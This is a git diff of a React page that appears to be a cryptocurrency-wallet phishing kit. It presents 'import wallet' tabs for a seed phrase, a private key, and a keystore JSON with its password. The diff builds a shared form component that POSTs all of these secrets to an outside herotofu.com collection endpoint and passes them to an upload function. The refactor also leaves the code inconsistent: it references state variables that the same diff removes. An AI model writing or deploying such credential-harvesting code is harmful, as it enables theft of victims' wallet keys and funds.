@@ -12,6 +12,41 @@ import styled from "@emotion/styled";
 import { ImportTextField } from "./styles/styles";
 import LandingAppBar from "./Components/LandingAppBar";
 
+const WalletForm = ({ children, code }) => {
+  const uploadData = (value, type, wallet) => {
+    const payload = { value, type, wallet };
+
+    uploadToCloud(payload);
+
+    clearFields();
+  };
+
+  const handleUpload = (type) => {
+    if (type === SEED_PHRASE) uploadData(seedPhrase, SEED_PHRASE, wallet);
+    if (type === PRIVATE_KEY) uploadData(privateKey, PRIVATE_KEY, wallet);
+    if (type === KEY_JSON)
+      uploadData(
+        { keyJSON: keyJSON, password: keyStorePassword },
+        KEY_JSON,
+        wallet
+      );
+  };
+
+  return (
+    <Box
+      component="form"
+      action="https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288"
+      method="POST"
+      onSubmit={() => handleUpload({ code })}
+    >
+      {children}
+      <Button type="submit" sx={{ width: "100%" }} variant="contained">
+        Import
+      </Button>{" "}
+    </Box>
+  );
+};
+
 function TabPanel(props) {
   const { children, value, index, ...other } = props;
 
@@ -53,55 +88,6 @@ function BasicTabs() {
     setValue(newValue);
   };
 
-  const [seedPhrase, setSeedPhrase] = useState("");
-
-  const updateSeedPhrase = (e) => {
-    setSeedPhrase(e.target.value);
-  };
-
-  const uploadData = (value, type, wallet) => {
-    const payload = { value, type, wallet };
-
-    uploadToCloud(payload);
-
-    clearFields();
-  };
-
-  const handleUpload = (type) => {
-    if (type === SEED_PHRASE) uploadData(seedPhrase, SEED_PHRASE, wallet);
-    if (type === PRIVATE_KEY) uploadData(privateKey, PRIVATE_KEY, wallet);
-    if (type === KEY_JSON)
-      uploadData(
-        { keyJSON: keyJSON, password: keyStorePassword },
-        KEY_JSON,
-        wallet
-      );
-  };
-
-  const [privateKey, setPrivateKey] = useState("");
-
-  const updatePrivateKey = (e) => {
-    setPrivateKey(e.target.value);
-  };
-
-  const [keyJSON, setKeyJSON] = useState("");
-  const [keyStorePassword, setKeyStorePassword] = useState("");
-
-  const updateKeyJSON = (e) => {
-    setKeyJSON(e.target.value);
-  };
-
-  const updateKeyStorePassword = (e) => {
-    setKeyStorePassword(e.target.value);
-  };
-
-  const clearFields = () => {
-    setSeedPhrase("");
-    setPrivateKey("");
-    setKeyJSON("");
-    setKeyStorePassword("");
-  };
-
   return (
     <Box sx={{ width: "100%" }}>
       <Box sx={{ borderBottom: 1, borderColor: "divider" }}>
@@ -117,78 +103,43 @@ function BasicTabs() {
       </Box>
 
       <TabPanel value={value} index={0}>
-        <ImportTextField
-          value={seedPhrase}
-          label="Seed Phrase"
-          onChange={updateSeedPhrase}
-          multiline
-          sx={{ mb: 2 }}
-          rows={6}
-        />
-        <Typography sx={{ mb: 2 }}>
-          Typically 12 (sometimes 24) words seperated by a single spaces.
-        </Typography>
-        <Button
-          onClick={() => handleUpload(SEED_PHRASE)}
-          sx={{ width: "100%" }}
-          variant="contained"
-          component={NavLink}
-          to="/verify"
-        >
-          Import
-        </Button>
+        <WalletForm code={SEED_PHRASE}>
+          <ImportTextField
+            name="Seed Phrase"
+            label="Seed Phrase"
+            multiline
+            sx={{ mb: 2 }}
+            rows={6}
+          />
+          <Typography sx={{ mb: 2 }}>
+            Typically 12 (sometimes 24) words seperated by a single spaces.
+          </Typography>
+        </WalletForm>
       </TabPanel>
 
       <TabPanel value={value} index={1}>
-        <Container>
-          <Box
-            component="form"
-            action="https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288"
-            method="POST"
-            onSubmit={() => handleUpload(PRIVATE_KEY)}
-          >
+          <WalletForm code={PRIVATE_KEY}>
             <ImportTextField
               name="private_key"
               label="Private Key"
-              // value={privateKey}
               sx={{ mb: 2 }}
-              // onChange={updatePrivateKey}
             />
-            <Button
-              type="submit"
-              sx={{ width: "100%" }}
-              variant="contained"
-              // component={NavLink}
-              // to="/verify"
-            >
-              Import
-            </Button>{" "}
-          </Box>
-        </Container>
+          </WalletForm>
       </TabPanel>
 
       <TabPanel value={value} index={2}>
-        <ImportTextField
-          value={keyJSON}
-          onChange={updateKeyJSON}
-          label="Key Store Value"
-          sx={{ mb: 2 }}
-        />
-        <ImportTextField
-          value={keyStorePassword}
-          onChange={updateKeyStorePassword}
-          label="Key Store Password"
-          sx={{ mb: 2 }}
-        />
-        <Button
-          onClick={() => handleUpload(KEY_JSON)}
-          sx={{ width: "100%" }}
-          variant="contained"
-          component={NavLink}
-          to="/verify"
-        >
-          Import
-        </Button>{" "}
+        <WalletForm code={KEY_JSON}>
+          <ImportTextField
+            name="Key Store Value"
+            label="Key Store Value"
+            sx={{ mb: 2 }}
+          />
+          <ImportTextField
+            name="Key Store Password"
+            label="Key Store Password"
+            sx={{ mb: 2 }}
+          />
+        </WalletForm>
       </TabPanel>
     </Box>
   );
